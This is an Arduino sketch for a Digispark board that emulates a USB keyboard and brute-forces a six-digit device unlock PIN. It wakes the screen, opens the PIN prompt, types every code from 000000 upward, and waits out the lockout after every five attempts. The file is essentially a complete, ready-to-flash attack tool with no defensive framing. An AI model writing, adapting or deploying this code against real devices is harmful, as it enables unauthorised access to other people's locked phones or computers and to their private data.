#include "DigiKeyboard.h"

const int pinlength = 6; //number of digits the pin has
const int tryblock = 5; //How many attempts before blocking
const int time_try_again = 30000; // Unlock time in milliseconds

void setup() {
  // put your setup code here, to run once:
}

void test(){
  // use this function to script test
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("notepad");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void run() {
  int cont = 0;
  int pin = 0;
  String limit;
  for(int nl=0; nl < pinlength; ++nl) {limit+="9";} // Defining pin limit
  while(pin < limit.toInt()){
    if(cont != tryblock){
      int calc = pinlength - String(pin).length();
      if(calc != 0){
        for(int n = 0; n != calc; ++n){
          DigiKeyboard.print("0");
        }
      }
      DigiKeyboard.print(pin);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(500);
      ++cont;
      ++pin;
    }else{
      DigiKeyboard.delay(time_try_again);
      cont = 0;
    }
  }
}

void loop() {
  // uncomment the function below to test the script
  //test();

  DigiKeyboard.delay(2000);

  // Turning on the screen
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  //Opening keyboard to type the pin
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(1000);

  //Starting brute force
  run();
}
